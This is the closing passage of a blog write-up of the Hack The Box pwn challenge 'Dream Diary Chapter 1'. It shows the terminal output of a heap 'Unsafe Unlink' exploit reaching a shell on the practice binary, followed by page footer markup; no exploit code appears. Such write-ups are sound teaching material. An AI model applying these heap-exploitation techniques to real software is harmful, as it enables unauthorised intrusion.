</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Switching</span> <span class="n">to</span> <span class="n">interactive</span> <span class="n">mode</span>
</span></span><span class="line"><span class="cl"><span class="n">Invalid</span> <span class="n">choice</span><span class="err">!</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">+------------------------------+</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span>         <span class="n">Dream</span> <span class="n">Diary</span>          <span class="o">|</span>
</span></span><span class="line"><span class="cl"><span class="o">+------------------------------+</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="n">Allocate</span>                 <span class="o">|</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="n">Edit</span>                     <span class="o">|</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="n">Delete</span>                   <span class="o">|</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="n">Exit</span>                     <span class="o">|</span>
</span></span><span class="line"><span class="cl"><span class="o">+------------------------------+</span>
</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;</span> <span class="err">$</span> 
</span></span><span class="line"><span class="cl"><span class="err">$</span> <span class="n">whoami</span>
</span></span><span class="line"><span class="cl"><span class="n">vagrant</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span> 
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Interrupted</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Stopped</span> <span class="n">program</span> <span class="s1">&#39;./chapter1&#39;</span>
</span></span></code></pre></div><p>And that was it, congratulations, now you learned the Unsafe Unlink, as my blog was silent for a while, this was in draft so here it is now.</p>

    </section>
    <footer class="pt-8">
      
  
  <section class="flex flex-row flex-wrap justify-center pt-4 text-xl">
    
      
        <a
          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
          href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:1313/posts/dream-diary-chapter-1/&amp;quote=HTB%20Pwn%20-%20Dream%20Diary%20Chapter:%201"
          title="Share on Facebook"
          aria-label="Share on Facebook"
          target="_blank"
          rel="noopener noreferrer"
          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.28c-30.8 0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"/></svg>
</span></a
        >
      
    
      
        <a
          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
          href="https://x.com/intent/tweet/?url=http://localhost:1313/posts/dream-diary-chapter-1/&amp;text=HTB%20Pwn%20-%20Dream%20Diary%20Chapter:%201"
          title="Post on X"
          aria-label="Post on X"
          target="_blank"
          rel="noopener noreferrer"
          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg>
</span></a
        >
      
    
      
        <a
          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
          href="https://pinterest.com/pin/create/bookmarklet/?url=http://localhost:1313/posts/dream-diary-chapter-1/&amp;description=HTB%20Pwn%20-%20Dream%20Diary%20Chapter:%201"
          title="Pin on Pinterest"
          aria-label="Pin on Pinterest"
          target="_blank"
          rel="noopener noreferrer"
          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M496 256c0 137-111 248-248 248-25.6 0-50.2-3.9-73.4-11.1 10.1-16.5 25.2-43.5 30.8-65 3-11.6 15.4-59 15.4-59 8.1 15.4 31.7 28.5 56.8 28.5 74.8 0 128.7-68.8 128.7-154.3 0-81.9-66.9-143.2-152.9-143.2-107 0-163.9 71.8-163.9 150.1 0 36.4 19.4 81.7 50.3 96.1 4.7 2.2 7.2 1.2 8.3-3.3.8-3.4 5-20.3 6.9-28.1.6-2.5.3-4.7-1.7-7.1-10.1-12.5-18.3-35.3-18.3-56.6 0-54.7 41.4-107.6 112-107.6 60.9 0 103.6 41.5 103.6 100.9 0 67.1-33.9 113.6-78 113.6-24.3 0-42.6-20.1-36.7-44.8 7-29.5 20.5-61.3 20.5-82.6 0-19-10.2-34.9-31.4-34.9-24.9 0-44.9 25.7-44.9 60.2 0 22 7.4 36.8 7.4 36.8s-24.5 103.8-29 123.2c-5 21.4-3 51.6-.9 71.2C65.4 450.9 0 361.1 0 256 0 119 111 8 248 8s248 111 248 248z"/></svg>
</span></a
        >
      
    
      
        <a
          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
          href="https://reddit.com/submit/?url=http://localhost:1313/posts/dream-diary-chapter-1/&amp;resubmit=true&amp;title=HTB%20Pwn%20-%20Dream%20Diary%20Chapter:%201"
          title="Submit to Reddit"
          aria-label="Submit to Reddit"
          target="_blank"
          rel="noopener noreferrer"
          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M201.5 305.5c-13.8 0-24.9-11.1-24.9-24.6 0-13.8 11.1-24.9 24.9-24.9 13.6 0 24.6 11.1 24.6 24.9 0 13.6-11.1 24.6-24.6 24.6zM504 256c0 137-111 248-248 248S8 393 8 256 119 8 256 8s248 111 248 248zm-132.3-41.2c-9.4 0-17.7 3.9-23.8 10-22.4-15.5-52.6-25.5-86.1-26.6l17.4-78.3 55.4 12.5c0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.3 24.9-24.9s-11.1-24.9-24.9-24.9c-9.7 0-18 5.8-22.1 13.8l-61.2-13.6c-3-.8-6.1 1.4-6.9 4.4l-19.1 86.4c-33.2 1.4-63.1 11.3-85.5 26.8-6.1-6.4-14.7-10.2-24.1-10.2-34.9 0-46.3 46.9-14.4 62.8-1.1 5-1.7 10.2-1.7 15.5 0 52.6 59.2 95.2 132 95.2 73.1 0 132.3-42.6 132.3-95.2 0-5.3-.6-10.8-1.9-15.8 31.3-16 19.8-62.5-14.9-62.5zM302.8 331c-18.2 18.2-76.1 17.9-93.6 0-2.2-2.2-6.1-2.2-8.3 0-2.5 2.5-2.5 6.4 0 8.6 22.8 22.8 87.3 22.8 110.2 0 2.5-2.2 2.5-6.1 0-8.6-2.2-2.2-6.1-2.2-8.3 0zm7.7-75c-13.6 0-24.6 11.1-24.6 24.9 0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.1 24.9-24.6 0-13.8-11-24.9-24.9-24.9z"/></svg>
</span></a
        >
      
    
      
        <a
          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
          href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http://localhost:1313/posts/dream-diary-chapter-1/&amp;title=HTB%20Pwn%20-%20Dream%20Diary%20Chapter:%201"
          title="Share on LinkedIn"
          aria-label="Share on LinkedIn"
          target="_blank"
          rel="noopener noreferrer"
          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
</span></a
        >
      
    
      
        <a
          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
          href="mailto:?body=http://localhost:1313/posts/dream-diary-chapter-1/&amp;subject=HTB%20Pwn%20-%20Dream%20Diary%20Chapter:%201"
          title="Send via email"
          aria-label="Send via email"
          target="_blank"
          rel="noopener noreferrer"
          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M207.8 20.73c-93.45 18.32-168.7 93.66-187 187.1c-27.64 140.9 68.65 266.2 199.1 285.1c19.01 2.888 36.17-12.26 36.17-31.49l.0001-.6631c0-15.74-11.44-28.88-26.84-31.24c-84.35-12.98-149.2-86.13-149.2-174.2c0-102.9 88.61-185.5 193.4-175.4c91.54 8.869 158.6 91.25 158.6 183.2l0 16.16c0 22.09-17.94 40.05-40 40.05s-40.01-17.96-40.01-40.05v-120.1c0-8.847-7.161-16.02-16.01-16.02l-31.98 .0036c-7.299 0-13.2 4.992-15.12 11.68c-24.85-12.15-54.24-16.38-86.06-5.106c-38.75 13.73-68.12 48.91-73.72 89.64c-9.483 69.01 43.81 128 110.9 128c26.44 0 50.43-9.544 69.59-24.88c24 31.3 65.23 48.69 109.4 37.49C465.2 369.3 496 324.1 495.1 277.2V256.3C495.1 107.1 361.2-9.332 207.8 20.73zM239.1 304.3c-26.47 0-48-21.56-48-48.05s21.53-48.05 48-48.05s48 21.56 48 48.05S266.5 304.3 239.1 304.3z"/></svg>
</span></a
        >
      
    
      
        <a
          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
          href="https://www.threads.net/intent/post?text=http://localhost:1313/posts/dream-diary-chapter-1/%20HTB%20Pwn%20-%20Dream%20Diary%20Chapter:%201"
          title="Post on Threads"
          aria-label="Post on Threads"
          target="_blank"
          rel="noopener noreferrer"
          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M331.5 235.7c2.2 .9 4.2 1.9 6.3 2.8c29.2 14.1 50.6 35.2 61.8 61.4c15.7 36.5 17.2 95.8-30.3 143.2c-36.2 36.2-80.3 52.5-142.6 53h-.3c-70.2-.5-124.1-24.1-160.4-70.2c-32.3-41-48.9-98.1-49.5-169.6V256v-.2C17 184.3 33.6 127.2 65.9 86.2C102.2 40.1 156.2 16.5 226.4 16h.3c70.3 .5 124.9 24 162.3 69.9c18.4 22.7 32 50 40.6 81.7l-40.4 10.8c-7.1-25.8-17.8-47.8-32.2-65.4c-29.2-35.8-73-54.2-130.5-54.6c-57 .5-100.1 18.8-128.2 54.4C72.1 146.1 58.5 194.3 58 256c.5 61.7 14.1 109.9 40.3 143.3c28 35.6 71.2 53.9 128.2 54.4c51.4-.4 85.4-12.6 113.7-40.9c32.3-32.2 31.7-71.8 21.4-95.9c-6.1-14.2-17.1-26-31.9-34.9c-3.7 26.9-11.8 48.3-24.7 64.8c-17.1 21.8-41.4 33.6-72.7 35.3c-23.6 1.3-46.3-4.4-63.9-16c-20.8-13.8-33-34.8-34.3-59.3c-2.5-48.3 35.7-83 95.2-86.4c21.1-1.2 40.9-.3 59.2 2.8c-2.4-14.8-7.3-26.6-14.6-35.2c-10-11.7-25.6-17.7-46.2-17.8H227c-16.6 0-39 4.6-53.3 26.3l-34.4-23.6c19.2-29.1 50.3-45.1 87.8-45.1h.8c62.6 .4 99.9 39.5 103.7 107.7l-.2 .2zm-156 68.8c1.3 25.1 28.4 36.8 54.6 35.3c25.6-1.4 54.6-11.4 59.5-73.2c-13.2-2.9-27.8-4.4-43.4-4.4c-4.8 0-9.6 .1-14.4 .4c-42.9 2.4-57.2 23.2-56.2 41.8l-.1 .1z"/></svg>
</span></a
        >
      
    
      
        <a
          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
          href="https://telegram.me/share/url?text=http://localhost:1313/posts/dream-diary-chapter-1/&amp;url=HTB%20Pwn%20-%20Dream%20Diary%20Chapter:%201"
          title="Share on Telegram"
          aria-label="Share on Telegram"
          target="_blank"
          rel="noopener noreferrer"
          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M248,8C111.033,8,0,119.033,0,256S111.033,504,248,504,496,392.967,496,256,384.967,8,248,8ZM362.952,176.66c-3.732,39.215-19.881,134.378-28.1,178.3-3.476,18.584-10.322,24.816-16.948,25.425-14.4,1.326-25.338-9.517-39.287-18.661-21.827-14.308-34.158-23.215-55.346-37.177-24.485-16.135-8.612-25,5.342-39.5,3.652-3.793,67.107-61.51,68.335-66.746.153-.655.3-3.1-1.154-4.384s-3.59-.849-5.135-.5q-3.283.746-104.608,69.142-14.845,10.194-26.894,9.934c-8.855-.191-25.888-5.006-38.551-9.123-15.531-5.048-27.875-7.717-26.8-16.291q.84-6.7,18.45-13.7,108.446-47.248,144.628-62.3c68.872-28.647,83.183-33.623,92.511-33.789,2.052-.034,6.639.474,9.61,2.885a10.452,10.452,0,0,1,3.53,6.716A43.765,43.765,0,0,1,362.952,176.66Z"/></svg>
</span></a
        >
      
    
  </section>


    </footer>
  </article>

        
          <div class="pointer-events-none absolute bottom-0 end-0 top-[100vh] w-12">
            <a
              href="#the-top"
              class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
              aria-label="Scroll to top"
              title="Scroll to top"
            >
              &uarr;
            </a>
          </div>
        
      </main><footer class="py-10 print:hidden">
  
  
    <nav class="pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400">
      <ul class="flex list-none flex-col sm:flex-row">
        
          
          <li class="group mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0">
            
              <a
                href="/tags/"
                title=""
                
                ><span
                    class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                    >Tags</span
                  >
                </a
              >
            
          </li>
        
      </ul>
    </nav>
  
  <div class="flex items-center justify-between">
    <div>
      
      
        <p class="text-sm text-neutral-500 dark:text-neutral-400">
            Copy, <em>right?</em> 🤔
        </p>
      
      
      
        <p class="text-xs text-neutral-500 dark:text-neutral-400">
          
          
          Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
            href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://github.com/jpanther/congo" target="_blank" rel="noopener noreferrer">Congo</a>
        </p>
      
    </div>
    <div class="flex flex-row items-center">
      
      
      
      
        <div
          class="me-14 cursor-pointer text-sm text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
        >
          <button id="appearance-switcher-0" type="button" aria-label="appearance switcher">
            <div
              class="flex h-12 w-12 items-center justify-center dark:hidden"
              title="Switch to dark appearance"
            >
              <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
</span>
            </div>
            <div
              class="hidden h-12 w-12 items-center justify-center dark:flex"
              title="Switch to light appearance"
            >
              <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
</span>
            </div>
          </button>
        </div>
      
    </div>
  </div>
  
  
</footer>
<div
  id="search-wrapper"
  class="invisible fixed inset-0 z-50 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
  data-url="http://localhost:1313/"
>
  <div
    id="search-modal"
    class="top-20 mx-auto flex min-h-0 w-full max-w-3xl flex-col rounded-md border border-neutral-200 bg-neutral shadow-lg dark:border-neutral-700 dark:bg-neutral-800"
  >
    <header class="relative z-10 flex flex-none items-center justify-between px-2">
      <form class="flex min-w-0 flex-auto items-center">
        <div class="flex h-8 w-8 items-center justify-center text-neutral-400">
          <span class="icon relative inline-block px-1 align-text-bottom"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span>
        </div>
        <input
          type="search"
          id="search-query"
          class="mx-1 flex h-12 flex-auto appearance-none bg-transparent focus:outline-dotted focus:outline-2 focus:outline-transparent"
          placeholder="Search"
          tabindex="0"
        />
      </form>
      <button
        id="close-search-button"
        class="flex h-8 w-8 items-center justify-center text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
        title="Close (Esc)"
      >
        <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
</span>
      </button>
    </header>
    <section class="flex-auto overflow-auto px-2">
      <ul id="search-results">
        
      </ul>
    </section>
  </div>
</div>

    </div>
  </body>
</html>
